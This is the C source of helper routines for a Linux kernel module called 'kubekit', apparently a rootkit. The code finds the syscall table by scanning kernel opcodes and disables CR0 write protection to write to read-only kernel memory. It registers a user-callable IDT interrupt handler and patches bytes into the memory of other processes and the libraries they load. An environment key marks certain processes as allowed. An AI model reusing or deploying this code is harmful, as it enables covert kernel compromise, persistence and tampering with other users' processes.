#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/path.h>
#include <linux/dcache.h>
#include <linux/namei.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/mm.h>
#include <linux/vmalloc.h>
#include <linux/fs_struct.h>
#include <linux/file.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 8, 0)
#include <linux/pgtable.h>
#else
#include <asm/pgtable.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 10, 0)
#include <linux/kernel_read_file.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#include <linux/kprobes.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
#include <linux/kallsyms.h>
#endif

#include "helpers.h"
#include "kubekit.h"

gate_desc *idt_table;
gate_desc prev_irq;
int kubekit_irq_num;

char *file_from_fd(int fd) {
    struct file *file;
    char *full, *path, *ret;
    size_t len;

    file = fget(fd);
    if (file == NULL) {
        return NULL;
    }

    full = kmalloc(PATH_MAX, GFP_KERNEL);
    if (full == NULL) {
        fput(file);
        return NULL;
    }

    path = d_path(&file->f_path, full, PATH_MAX);
    if (IS_ERR(path)) {
        fput(file);
        kfree(full);
        return NULL;
    }

    len = strlen(path);
    if (len == 0) {
        fput(file);
        kfree(full);
        return NULL;
    }

    ret = kmalloc(len + 1, GFP_KERNEL);
    if (ret == NULL) {
        fput(file);
        kfree(full);
        return NULL;
    }
    ret[len] = '\0';

    strcpy(ret, path);

    fput(file);
    kfree(full);
    return ret;
}

char *format_str(const char *fmt, ...) {
    char *str;
    ssize_t size;
    va_list args;

    va_start(args, fmt);
    size = vsnprintf(NULL, 0, fmt, args);
    va_end(args);

    if (size <= 0) {
        return NULL;
    }

    str = kmalloc(size + 1, GFP_KERNEL);
    if (str == NULL) {
        return NULL;
    }

    va_start(args, fmt);
    vsnprintf(str, size + 1, fmt, args);
    va_end(args);
    
    return str;
}

char *extract_filename_from_full_path(char *s) {
    char *ret = s;
    ssize_t len, i;

    len = strlen(s);
    if (len == 0) {
        return ret;
    }

    for (i = len - 1; i >= 0; i--) {
        if (s[i] == '/') {
            if (s[i + 1] != '\0') {
                ret = &s[i + 1];
            }
            break;
        }
    }

    return ret;
}

bool task_env_allowed(struct task_struct *task) {
    char *envp;
    char *buf;
    long size;

    if (task->mm == NULL ||
        (char *)task->mm->env_start == NULL ||
        (char *)task->mm->env_end == NULL) {
        return false;
    }

    buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
    if (buf == NULL) {
        return false;
    }

    envp = (char *)task->mm->env_start;
    while (envp < (char *)task->mm->env_end) {
        size = strncpy_from_user(buf, envp, PAGE_SIZE);
        if (size <= 0) {
            break;
        }

        // if env var is longer than the buffer size
        // skip (assuming KUBEKIT_ENV_KEY length is
        // less than the size of the buffer)
        if (size == PAGE_SIZE) {
            envp += PAGE_SIZE;
            continue;
        }

        if (strcmp(buf, KUBEKIT_ENV_KEY) == 0) {
            kfree(buf);
            return true;
        }

        envp += strlen(buf) + 1;
    }

    kfree(buf);
    return false;
}

char *fix_path(char *full_path, unsigned int mode) {
    struct path path;
    char *p, *tmp;
    char *new;

    if (kern_path(full_path, mode, &path) != 0) {
        return NULL;
    }

    tmp = kmalloc(PATH_MAX, GFP_KERNEL);
    if (tmp == NULL) {
        return NULL;
    }

    p = d_path(&path, tmp, PATH_MAX);
    if (IS_ERR(p)) {
        kfree(tmp);
        return NULL;
    }

    new = kmalloc(strlen(p) + 1, GFP_KERNEL);
    if (new == NULL) {
        kfree(tmp);
        return NULL;
    }

    new[strlen(p)] = '\0';
    strcpy(new, p);

    kfree(tmp);
    return new;
}

char *full_path_to_file_user(struct task_struct *task,
                             char __user *filename,
                             unsigned int mode) {
    char *full_path_dir;
    char *full_path_file;
    char *tmp;
    int size;
    char *copied;
    char *ret;

    copied = kmalloc(PATH_MAX + 1, GFP_KERNEL);
    if (copied == NULL) {
        return NULL;
    }

    size = strncpy_from_user(copied, filename, PATH_MAX);
    if (size <= 0) {
        kfree(copied);
        return NULL;
    }
    copied[size] = '\0';

    if (*copied == '/') {
        ret = fix_path(copied, mode);
        kfree(copied);
        return ret;
    }

    tmp = kmalloc(PATH_MAX, GFP_KERNEL);
    if (tmp == NULL) {
        kfree(copied);
        return NULL;
    }

    full_path_dir = d_path(&task->fs->pwd, tmp, PATH_MAX);
    if (IS_ERR(full_path_dir)) {
        kfree(copied);
        kfree(tmp);
        return NULL;
    }

    full_path_file = format_str("%s/%s", full_path_dir, copied);
    if (full_path_file == NULL) {
        return NULL;
    }

    ret = fix_path(full_path_file, mode);

    kfree(copied);
    kfree(tmp);
    kfree(full_path_file);
    return ret;
}

void *get_sys_call_table(void) {
    void *syscall_table = NULL;
    void **ia32_syscall_table = NULL;
    u8 *entry_INT80_compat;
    u8 *do_int80_syscall_32 = NULL;
    u8 *sys_fork, *sys_restart_syscall;
    int off;
    u32 i;
    void **curr;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
    struct kprobe kp;

    kp.symbol_name = "sys_call_table";
    if (register_kprobe(&kp) == 0) {
        syscall_table = kp.addr;
        unregister_kprobe(&kp);
    }
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
    if (syscall_table == NULL) {
        syscall_table = (void *)kallsyms_lookup_name("sys_call_table");
    }
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
    if (syscall_table == NULL) {
        for (curr = (void **)sys_close; curr < ULONG_MAX; curr++) {
            if (curr[__NR_close] == (void *)sys_close) {
                syscall_table = curr;
                break;
            }
        }
    }
#endif

#ifdef CONFIG_X86_64
    if (syscall_table == NULL) {
        entry_INT80_compat = (u8 *)idt_read_handler(0x80);

        // find call do_int80_syscall_32
        for (i = 0; i < PAGE_SIZE; i++) {
            if (memcmp(&entry_INT80_compat[i], "\x48\x89\xE7\xE8", 4) == 0) {
                off = *(int *)(entry_INT80_compat + i + 4);
                do_int80_syscall_32 = &entry_INT80_compat[i + 4] + off + 4;
                break;
            }
        }

        if (do_int80_syscall_32 == NULL) {
            return NULL;
        }

        // find ia32_sys_call_table reference
        // within do_int80_syscall_32
        for (i = 0; i < PAGE_SIZE; i++) {
            if (memcmp(&do_int80_syscall_32[i], "\x48\x8B\x04\xC5", 4) == 0) {
                ia32_syscall_table = 
                    (void **)(((u64)0xffffffff << 32) |
                    ((u32)(*(int *)(do_int80_syscall_32 + i + 4))));
                break;
            }

        }

        if (ia32_syscall_table == NULL) {
            return NULL;
        }

        // fork and restart_syscall have the same
        // value in both ia32_sys_call_table and
        // sys_call_table
        sys_restart_syscall = ia32_syscall_table[0];
        sys_fork = ia32_syscall_table[2];

        curr = (void **)((u64)sys_fork & (u64)(~0xf));
        for (; (u64)curr < ULONG_MAX; curr++) {
            if (curr[__NR_fork] == sys_fork &&
                curr[__NR_restart_syscall] == sys_restart_syscall) {
                syscall_table = (void *)curr;
                break;
            }
        }
    }
#endif

    return syscall_table;
}

bool valid_return(struct task_struct *task, u64 addr) {
    struct vm_area_struct *vma;

    vma = get_vma_from_ptr(task, addr);
    if (vma == NULL) {
        return false;
    }

    if (vma->vm_flags & VM_EXEC) {
        return true;
    }

    return false;
}

bool valid_stack(struct task_struct *task, u64 addr) {
    struct vm_area_struct *vma;

    vma = get_vma_from_ptr(task, addr);
    if (vma == NULL) {
        return false;
    }

    if (vma->vm_flags & (VM_GROWSDOWN | VM_STACK)) {
        return true;
    }

    return false;
}

struct vm_area_struct *get_vma_from_ptr(struct task_struct *task, u64 ptr) {
    struct vm_area_struct *vma;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
    VMA_ITERATOR(vmi, task->mm, 0);

    for_each_vma(vmi, vma) {
        if (ptr > vma->vm_start && ptr < vma->vm_end) {
            return vma;
        }
    }
#else
    if (task->mm == NULL) {
        return NULL;
    }

    vma = task->mm->mmap;
    while (vma) {
        if (ptr > vma->vm_start && ptr < vma->vm_end) {
            return vma;
        }

        vma = vma->vm_next;
    }
#endif

    return NULL;
}

u64 get_file_base_from_task_struct(struct task_struct *task, char *file) {
    char *full_path, *p;
    struct vm_area_struct *vma;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
    VMA_ITERATOR(vmi, task->mm, 0);
#endif

    if (task->mm == NULL) {
        return 0;
    }

    full_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (full_path == NULL) {
        return 0;
    }

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
    for_each_vma(vmi, vma) {
        if (vma->vm_file == NULL) {
            continue;
        }

        p = d_path(&vma->vm_file->f_path, full_path, PATH_MAX);
        if (*file != '/') {
            p = extract_filename_from_full_path(p);
        }

        if (strcmp(file, p) == 0) {
            kfree(full_path);
            return vma->vm_start - vma->vm_pgoff * PAGE_SIZE;
        }
    }
#else
    vma = task->mm->mmap;
    while (vma) {
        if (vma->vm_file == NULL) {
            vma = vma->vm_next;
            continue;
        }

        p = d_path(&vma->vm_file->f_path, full_path, PATH_MAX);
        if (*file != '/') {
            p = extract_filename_from_full_path(p);
        }

        if (strcmp(file, p) == 0) {
            kfree(full_path);
            return vma->vm_start - vma->vm_pgoff * PAGE_SIZE;
        }

        vma = vma->vm_next;
    }
#endif

    kfree(full_path);

    return 0;
}

u64 get_task_cr3(struct task_struct *task) {
    u64 cr3;
    u64 base;

    if (task->mm == NULL) {
        return 0;
    }

    asm volatile("mov %%cr3, %0" : "=r"(cr3));
    cr3 &= ~((1 << PAGE_SHIFT) - 1);
    base = (u64)current->mm->pgd - cr3;

    return (u64)task->mm->pgd - base;
}

int write_task_mem(struct task_struct *task, u8 *addr, u8 *bytes, size_t size) {
    u64 cr3;
    u64 phys_base;
    pgd_t *pgd;
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *pte;
    phys_addr_t phys_addr = 0;

    if (task->mm == NULL) {
        if (task == current) {
            goto current_write;
        }

        return -1;
    }

    asm volatile("mov %%cr3, %0" : "=r"(cr3));
    // on some kernels cr3 has lower bits (under PAGE_SIZE) populated,
    // remove those so we correcly calculate physical base address
    cr3 &= ~((1 << PAGE_SHIFT) - 1);
    phys_base = (u64)current->mm->pgd - cr3;

    pgd = pgd_offset(task->mm, (u64)addr);
    p4d = p4d_offset(pgd, (u64)addr);
    pud = pud_offset(p4d, (u64)addr);
    pmd = pmd_offset(pud, (u64)addr);
    pte = pte_offset_kernel(pmd, (u64)addr);

    if (!pte_present(*pte)) {
        if (task == current) {
            goto current_write;
        }

        return -1;
    }

    phys_addr = (phys_addr_t)(
        pte_val(*pte) & PAGE_MASK) | ((u64)addr & ~PAGE_MASK
    );
    memcpy((u8 *)phys_base + phys_addr, bytes, size);

    return 0;

current_write:
    disable_write_protection();
    if (copy_to_user(addr, bytes, size) != 0) {
        enable_write_protection();
        return -1;
    }
    enable_write_protection();

    return 0;
}

int read_task_mem(struct task_struct *task, u8 *addr, u8 *bytes, size_t size) {
    u64 cr3;
    u64 phys_base;
    pgd_t *pgd;
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *pte;
    phys_addr_t phys_addr = 0;

    if (task == current) {
        goto current_read;
    }

    if (task->mm == NULL) {
        return -1;
    }
    
    asm volatile("mov %%cr3, %0" : "=r"(cr3));
    cr3 &= ~((1 << PAGE_SHIFT) - 1);
    phys_base = (u64)current->mm->pgd - cr3;

    pgd = pgd_offset(task->mm, (u64)addr);
    p4d = p4d_offset(pgd, (u64)addr);
    pud = pud_offset(p4d, (u64)addr);
    pmd = pmd_offset(pud, (u64)addr);
    pte = pte_offset_kernel(pmd, (u64)addr);

    if (!pte_present(*pte)) {
        return -1;
    }

    phys_addr = (phys_addr_t)(
        pte_val(*pte) & PAGE_MASK) | ((u64)addr & ~PAGE_MASK
    );
    memcpy(bytes, (u8 *)phys_base + phys_addr, size);

    return 0;

current_read:
    if (copy_from_user(bytes, addr, size) != 0) {
        return -1;
    }

    return 0;
}

void write_to_all_proc(char *filename,
                       off_t offset,
                       u8 *bytes,
                       size_t size,
                       u8 *prev) {
    struct task_struct *task;
    u64 base_addr;
    char *full_path, *p;

    full_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (full_path == NULL) {
        return;
    }

    for_each_process(task) {
        p = get_path_from_task_struct(task, full_path);
        if (p == NULL) {
            continue;
        }

        if (*filename != '/') {
            p = extract_filename_from_full_path(p);
        }

        if (strcmp(filename, p) != 0) {
            continue;
        }

        if (task->mm == NULL) {
            continue;
        }

        base_addr = get_file_base_from_task_struct(task, filename);
        if (base_addr == 0) {
            continue;
        }

        if (*filename != '/' && prev != NULL) {
            if (read_task_mem(
                task,
                (u8 *)base_addr + offset,
                prev,
                size
            ) != 0) {
                continue;
            }
        }

        if (write_task_mem(task, (u8 *)base_addr + offset, bytes, size) == 0) {
            break;
        }
    }

    kfree(full_path);
}

void write_to_all_lib(char *filename, off_t offset, u8 *bytes, size_t size) {
    struct task_struct *task;
    u64 base_addr;
    char *full_path, *p;
    struct vm_area_struct *vma;

    full_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (full_path == NULL) {
        return;
    }

    for_each_process(task) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
        VMA_ITERATOR(vmi, task->mm, 0);
#endif

        if (task->mm == NULL) {
            continue;
        }

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
        for_each_vma(vmi, vma) {
            if (vma->vm_file == NULL) {
                continue;
            }

            p = d_path(&vma->vm_file->f_path, full_path, PATH_MAX);
            if (strcmp(filename, p) == 0) {
                base_addr = vma->vm_start - vma->vm_pgoff * PAGE_SIZE;
                write_task_mem(task, (u8 *)base_addr + offset, bytes, size);

                goto ret;
            }
        }
#else
        vma = task->mm->mmap;
        while (vma) {
            if (vma->vm_file == NULL) {
                vma = vma->vm_next;
                continue;
            }

            p = d_path(&vma->vm_file->f_path, full_path, PATH_MAX);
            if (strcmp(filename, p) == 0) {
                base_addr = vma->vm_start - vma->vm_pgoff * PAGE_SIZE;
                write_task_mem(task, (u8 *)base_addr + offset, bytes, size);

                goto ret;
            }

            vma = vma->vm_next;
        }
#endif
    }

ret:
    kfree(full_path);
}

inline ssize_t write_file(char *filename, u8 *buf, size_t size, loff_t pos) {
    struct file *file;
    ssize_t ret = -1;

    file = filp_open(filename, O_WRONLY, 0);
    if (IS_ERR(file)) {
        return ret;
    }

    ret = kernel_write(file, (void *)buf, size, &pos);
    filp_close(file, NULL);

    return ret;
}

inline u8 *read_file(char *filename) {
    u8 *buf = NULL;
    size_t file_sz;
    int ret;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 10, 0)
    ret = kernel_read_file_from_path(
        filename, 
        0,
        (void **)&buf,
        -1, 
        &file_sz, 
        0
    );
#else
    ret = kernel_read_file_from_path(
        filename,
        (void **)&buf,
        (loff_t *)&file_sz,
        0,
        0
    );
#endif
    if (ret < 0) {
        return NULL;
    }
    return buf;
}

// get full path from struct task_struct *
char *get_path_from_task_struct(struct task_struct *task, char *buf) {
    struct mm_struct *mm = task->mm;

    if (mm == NULL || mm->exe_file == NULL) {
        return NULL;
    }

    return d_path(&mm->exe_file->f_path, buf, PATH_MAX);
}

int setup_entry_handler(void (*entry_handler)) {
    u8 *rwx_buf;
    u8 *entry_INT80_compat;
    u32 mov = 0, i;

    // skip over swapgs; push rax; push rdi (+5)
    rwx_buf = (u8 *)(entry_handler + 5);
    // some kernels add additional instructions
    // at the beginning, find first nop.
    // check until PAGE_SIZE to have some boundary
    // as otherwise some gcc version will optimize
    // this whole function to just a single infinite
    // for loop
    for (i = 0; i < PAGE_SIZE; i++) {
        if (rwx_buf[i] == '\x90') {
            rwx_buf = &rwx_buf[i];
            break;
        }
    }

    entry_INT80_compat = (u8 *)idt_read_handler(0x80);
    if (entry_INT80_compat == NULL) {
        return -1;
    }

    // find mov rsp,QWORD PTR gs:cpu_current_top_of_stack
    for (i = 0; i < PAGE_SIZE; i++) {
        if (memcmp(&entry_INT80_compat[i], "\x65\x48\x8b\x24\x25", 5) == 0) {
            mov = i;
            break;
        }
    }
    
    if (mov == 0) {
        return -1;
    }

    disable_write_protection();

    // mov rdi, rsp
    *(u32 *)(rwx_buf) = 0xe78948;
    // mov rsp, QWORD PTR gs:cpu_current_top_of_stack
    memcpy(rwx_buf + 3, &entry_INT80_compat[mov], 9);
    // push   QWORD PTR [rdi+0x30]
    // push   QWORD PTR [rdi+0x28]
    // push   QWORD PTR [rdi+0x20]
    // push   QWORD PTR [rdi+0x18]
    // push   QWORD PTR [rdi+0x10]
    // push   QWORD PTR [rdi+0x8]
    // push   QWORD PTR [rdi]
    *(u32 *)(rwx_buf + 12) = 0x3077ff;
    *(u32 *)(rwx_buf + 15) = 0x2877ff;
    *(u32 *)(rwx_buf + 18) = 0x2077ff;
    *(u32 *)(rwx_buf + 21) = 0x1877ff;
    *(u32 *)(rwx_buf + 24) = 0x1077ff;
    *(u32 *)(rwx_buf + 27) = 0x0877ff;
    *(u16 *)(rwx_buf + 30) = 0x37ff;

    enable_write_protection();

    return 0;
}

int register_irq(void *entry_handler) {
    int i;

    // look for unused software interrupts
    // dpl = 3 for software interrupts
    for (i = 129; i < 256; i++) {
        if (idt_table[i].bits.dpl == 0) {
            prev_irq = idt_table[i];

            idt_write_handler(i, entry_handler);

            // set dpl flag to 3 (3 = software interrupt)
            // if dpl is not 3 handler will not get called
            disable_write_protection();
            idt_table[i].bits.dpl = 3;
            enable_write_protection();

            kubekit_irq_num = i;
            return i;
        }
    }

    return -1;
}

inline void cleanup_idt(void) {
    if (kubekit_irq_num >= 0) {
        // restore previous interrupt handler state
        disable_write_protection();
        idt_table[kubekit_irq_num] = prev_irq;
        enable_write_protection();
    }
}

inline void mywrite_cr0(unsigned long cr0) {
    unsigned long __force_order;
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

void enable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    mywrite_cr0(cr0);
}

// clears bit 16 of cr0 register which allows writing to read-only memory
void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    mywrite_cr0(cr0);
}

// writes handler function pointer to specified index into idt_table
void idt_write_handler(int idt_idx, void *new_handler) {
    disable_write_protection();

    idt_table[idt_idx].offset_low = ((u64)new_handler) & 0xffff;
    idt_table[idt_idx].offset_middle = (((u64)new_handler) >> 16) & 0xffff;
    idt_table[idt_idx].offset_high = ((u64)new_handler) >> 32;

    enable_write_protection();
}

// returns handler function pointer for specified index from idt_table
u64 idt_read_handler(int idt_idx) {
    return idt_table[idt_idx].offset_low |
        ((unsigned long)idt_table[idt_idx].offset_middle << 16) |
		((unsigned long)idt_table[idt_idx].offset_high << 32);
}
